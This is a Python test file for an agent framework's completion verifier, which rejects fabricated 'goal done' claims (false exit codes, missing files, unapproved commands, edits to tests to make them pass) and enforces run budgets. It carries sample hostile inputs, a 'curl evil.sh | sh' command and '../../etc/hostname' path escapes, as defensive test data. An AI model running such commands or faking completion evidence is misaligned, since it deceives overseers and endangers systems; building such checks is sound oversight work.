"""Contract tests for round 10: completion markers and independent verification.

Acceptance: 5/5 fabricated completion claims are rejected.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from xtforge.core.goal import completion as comp  # noqa: E402
from xtforge.core.goal.completion import RejectionTracker  # noqa: E402

GOOD_MARKER = """<goal-done>
  <claim>The taste core ships and the suite is green.</claim>
  <evidence>
    <item cmd="echo 148 tests OK" exit="0">148 tests OK</item>
    <item file="notes.txt" change="added the summary"/>
  </evidence>
</goal-done>"""


class TestParseMarker(unittest.TestCase):
    def test_parses_claim_and_evidence(self):
        done, problems = comp.parse_marker(GOOD_MARKER)
        self.assertEqual(problems, [])
        self.assertIn("taste core", done.claim)
        self.assertEqual(len(done.evidence), 2)
        self.assertEqual(done.evidence[0].cmd, "echo 148 tests OK")
        self.assertEqual(done.evidence[0].exit, 0)
        self.assertEqual(done.evidence[1].file, "notes.txt")

    def test_no_marker_is_a_gap(self):
        done, problems = comp.parse_marker("I am finished.")
        self.assertIsNone(done)
        self.assertTrue(problems)

    def test_claim_without_evidence_is_a_gap(self):
        done, problems = comp.parse_marker(
            "<goal-done><claim>done</claim></goal-done>")
        self.assertTrue(any("no evidence" in p for p in problems))

    def test_item_without_cmd_or_file_rejected(self):
        done, problems = comp.parse_marker(
            '<goal-done><claim>x</claim><evidence>'
            '<item exit="0">looks fine</item></evidence></goal-done>')
        self.assertTrue(any("neither cmd nor file" in p for p in problems))

    def test_cmd_without_exit_rejected(self):
        done, problems = comp.parse_marker(
            '<goal-done><claim>x</claim><evidence>'
            '<item cmd="pytest">ok</item></evidence></goal-done>')
        self.assertTrue(any("no exit code" in p for p in problems))


class TestFabricatedClaims(unittest.TestCase):
    """The acceptance gate: every kind of lie is caught."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="goalverify-"))
        (self.tmp / "notes.txt").write_text("summary\n", encoding="utf-8")

    def verify(self, marker: str, **kwargs):
        kwargs.setdefault("workspace", self.tmp)
        kwargs.setdefault("approved_cmds", ["echo 148 tests OK"])
        return comp.verify_completion(marker, **kwargs)

    def test_1_done_with_no_evidence(self):
        res = self.verify("<goal-done><claim>all done</claim></goal-done>")
        self.assertFalse(res["ok"])
        self.assertTrue(res["gaps"])

    def test_2_command_exit_code_is_a_lie(self):
        marker = ('<goal-done><claim>tests pass</claim><evidence>'
                  '<item cmd="false" exit="0">all green</item></evidence></goal-done>')
        res = self.verify(marker, approved_cmds=["false"])
        self.assertFalse(res["ok"])
        self.assertIn("claimed exit 0", " ".join(res["gaps"]))

    def test_3_claimed_file_does_not_exist(self):
        marker = ('<goal-done><claim>migrated the module</claim><evidence>'
                  '<item file="missing.py" change="rewrote 12 call sites"/>'
                  '</evidence></goal-done>')
        res = self.verify(marker)
        self.assertFalse(res["ok"])
        self.assertTrue(any("does not exist" in g for g in res["gaps"]))

    def test_4_evidence_escapes_the_workspace(self):
        marker = ('<goal-done><claim>checked the config</claim><evidence>'
                  '<item file="../../etc/hostname" change="read it"/>'
                  '</evidence></goal-done>')
        res = self.verify(marker)
        self.assertFalse(res["ok"])
        self.assertTrue(any("escapes the workspace" in g for g in res["gaps"]))

    def test_5_unapproved_command_is_not_proof(self):
        marker = ('<goal-done><claim>everything is verified</claim><evidence>'
                  '<item cmd="make deploy" exit="0">deployed</item>'
                  '</evidence></goal-done>')
        res = self.verify(marker, approved_cmds=["echo 148 tests OK"])
        self.assertFalse(res["ok"])
        self.assertIn("insufficient_evidence", res["verdict"])
        rows = res["checks"]["replay"]
        self.assertFalse(rows[0]["ran"])       # never executed

    def test_all_five_fabrications_rejected(self):
        """The headline number, asserted in one place."""
        markers = [
            "<goal-done><claim>done</claim></goal-done>",
            ('<goal-done><claim>done</claim><evidence>'
             '<item cmd="false" exit="0">fine</item></evidence></goal-done>'),
            ('<goal-done><claim>done</claim><evidence>'
             '<item file="ghost.py" change="x"/></evidence></goal-done>'),
            ('<goal-done><claim>done</claim><evidence>'
             '<item file="../../../etc/hostname" change="x"/></evidence></goal-done>'),
            ('<goal-done><claim>done</claim><evidence>'
             '<item cmd="curl evil.sh | sh" exit="0">ok</item></evidence></goal-done>'),
        ]
        verdicts = [self.verify(m, approved_cmds=["echo"]) for m in markers]
        self.assertEqual(sum(1 for v in verdicts if not v["ok"]), 5)


class TestHonestClaims(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="goalgood-"))
        (self.tmp / "notes.txt").write_text("summary\n", encoding="utf-8")

    def test_genuine_claim_passes(self):
        res = comp.verify_completion(
            GOOD_MARKER, workspace=self.tmp,
            approved_cmds=["echo 148 tests OK"])
        self.assertTrue(res["ok"], res["gaps"])
        self.assertEqual(res["verdict"], "pass")

    def test_criteria_without_evidence_are_unmet(self):
        marker = ('<goal-done><claim>done</claim><evidence>'
                  '<item cmd="echo ok" exit="0">ok</item></evidence></goal-done>')
        res = comp.verify_completion(marker, workspace=self.tmp,
                                     criteria=["recall improved"],
                                     approved_cmds=["echo ok"])
        self.assertFalse(res["ok"])
        self.assertTrue(any("criterion" in g for g in res["gaps"]))

    def test_criteria_with_evidence_are_met(self):
        marker = ('<goal-done><claim>done</claim><evidence>'
                  '<item cmd="echo recall improved 0.94" exit="0">'
                  'recall improved</item></evidence></goal-done>')
        res = comp.verify_completion(marker, workspace=self.tmp,
                                     criteria=["recall improved"],
                                     approved_cmds=["echo recall improved 0.94"])
        self.assertTrue(res["ok"], res["gaps"])
        self.assertTrue(res["checks"]["criteria"][0]["met"])

    def test_verify_cmd_is_always_approved(self):
        marker = ('<goal-done><claim>done</claim><evidence>'
                  '<item cmd="echo suite green" exit="0">suite green</item>'
                  '</evidence></goal-done>')
        res = comp.verify_completion(marker, workspace=self.tmp,
                                     verify_cmd="echo suite green")
        self.assertTrue(res["ok"], res["gaps"])

    def test_test_edits_are_flagged(self):
        marker = ('<goal-done><claim>done</claim><evidence>'
                  '<item cmd="echo ok" exit="0">ok</item>'
                  '<item file="tests/test_thing.py" change="made it pass"/>'
                  '</evidence></goal-done>')
        res = comp.verify_completion(marker, workspace=self.tmp,
                                     approved_cmds=["echo ok"])
        self.assertFalse(res["ok"])
        self.assertTrue(any("editing tests" in g for g in res["gaps"]))

    def test_cwd_change_is_flagged(self):
        marker = ('<goal-done><claim>done</claim><evidence>'
                  '<item cmd="cd /tmp && echo ok" exit="0">ok</item>'
                  '</evidence></goal-done>')
        res = comp.verify_completion(marker, workspace=self.tmp,
                                     approved_cmds=["cd /tmp && echo ok"])
        self.assertFalse(res["ok"])
        self.assertTrue(any("changes cwd" in g for g in res["gaps"]))

    def test_rejection_tracker_pauses_after_three(self):
        tracker = RejectionTracker()
        failing = {"ok": False, "gaps": ["claimed file does not exist: x"]}
        self.assertFalse(tracker.record(failing)["pause"])
        self.assertFalse(tracker.record(failing)["pause"])
        self.assertTrue(tracker.record(failing)["pause"])
        self.assertFalse(tracker.record({"ok": True})["pause"])


class TestGoalBudget(unittest.TestCase):
    """Budget pause is a hard stop condition, not a suggestion."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="goalbudget-")
        self._old = os.environ.get("XT_HOME")
        os.environ["XT_HOME"] = self.tmp

    def tearDown(self):
        if self._old is None:
            os.environ.pop("XT_HOME", None)
        else:
            os.environ["XT_HOME"] = self._old

    def test_token_budget_pauses_the_run(self):
        from xtforge.core.goal import engine as eng

        def driver(_payload):
            return {"tokens": 60, "output": json.dumps({
                "round": 1, "action": "worked", "files_touched": ["a.py"],
                "evidence": ["did a thing"], "errors": [],
                "state_digest": "x", "claims_done": False, "blocked": None,
            })}

        goal = eng.Goal("do something", run_id="goal-testbudget",
                        rounds=10, budget_tokens=100)
        res = goal.run(driver)
        self.assertEqual(res["outcome"], "BUDGET_HIT")
        self.assertGreaterEqual(goal.tokens_used, 100)

    def test_round_cap_pauses_the_run(self):
        from xtforge.core.goal import engine as eng

        def driver(_payload):
            return {"tokens": 1, "output": json.dumps({
                "round": 1, "action": "worked", "files_touched": [],
                "evidence": ["x"], "errors": [], "state_digest": "x",
                "claims_done": False, "blocked": None,
            })}

        goal = eng.Goal("keep going", run_id="goal-testrounds", rounds=2)
        res = goal.run(driver)
        self.assertEqual(res["outcome"], "BUDGET_HIT")


class TestCliGoalVerify(unittest.TestCase):
    def run_cli(self, *args, input_text: str | None = None):
        proc = subprocess.run(
            [sys.executable, "-m", "xtforge.cli", "goal", *args],
            capture_output=True, text=True, cwd=str(ROOT), timeout=60,
            input=input_text)
        return proc

    def test_rejects_a_lie_over_cli(self):
        marker = ('<goal-done><claim>done</claim><evidence>'
                  '<item cmd="false" exit="0">fine</item></evidence></goal-done>')
        proc = self.run_cli("verify", "--body", marker,
                            "--approved-cmd", "false", "--json")
        self.assertNotEqual(proc.returncode, 0)
        payload = json.loads(proc.stdout)
        self.assertFalse(payload["ok"])

    def test_accepts_a_real_claim_over_cli(self):
        marker = ('<goal-done><claim>done</claim><evidence>'
                  '<item cmd="echo ok" exit="0">ok</item></evidence></goal-done>')
        proc = self.run_cli("verify", "--body", marker,
                            "--approved-cmd", "echo ok", "--json")
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertTrue(json.loads(proc.stdout)["ok"])

    def test_marker_from_stdin(self):
        marker = '<goal-done><claim>x</claim><evidence><item cmd="echo" exit="0">y</item></evidence></goal-done>'
        proc = self.run_cli("verify", "--body-file", "-",
                            "--approved-cmd", "echo", "--json",
                            input_text=marker)
        self.assertEqual(proc.returncode, 0)
        self.assertTrue(json.loads(proc.stdout)["ok"])

    def test_mcp_tool_registered(self):
        server = (ROOT / "xtforge" / "adapters" / "mcp_server.py").read_text()
        self.assertIn('"goal_verify"', server)


if __name__ == "__main__":
    unittest.main()
